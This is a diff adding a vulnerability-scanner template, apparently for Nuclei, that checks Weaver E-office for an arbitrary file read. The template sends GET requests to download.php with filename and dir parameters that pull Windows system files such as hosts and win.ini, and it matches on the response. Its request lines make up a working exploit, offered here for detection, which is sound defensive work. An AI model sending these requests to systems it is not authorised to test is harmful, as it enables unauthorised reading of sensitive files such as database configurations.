@@ -1,0 +1,48 @@
+id: weaver-eoffice-file-read
+
+info:
+  name: Weaver E-office File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Weaver E-office Office Automation System has a file reading vulnerability that allows attackers to read sensitive files like database configuration files, posing a severe security risk.
+  tags: file-read
+
+variables:
+  filename: win.ini
+  dir: C:\\Windows\\
+
+http:
+  - raw:
+      - |
+        GET /general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:\\Windows\\System32\\drivers\\etc\\ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HOSTS"
+          - "Windows"
+
+  - raw:
+      - |
+        GET /general/file_folder/file_new/neworedit/download.php?filename={{filename}}&dir={{dir}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "([\\s\\S]+)"
+        internal: true
